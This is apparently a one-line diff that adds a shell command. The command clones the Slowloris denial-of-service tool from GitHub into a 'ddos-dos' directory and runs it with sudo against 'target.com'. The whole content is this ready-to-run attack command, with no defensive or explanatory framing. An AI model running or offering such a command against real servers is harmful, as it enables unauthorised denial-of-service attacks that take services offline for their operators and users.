@@ -1,0 +1,1 @@
+cd ddos-dos && git clone https://github.com/gkbrk/slowloris.git && cd slowloris && sudo python3 slowloris.py target.com
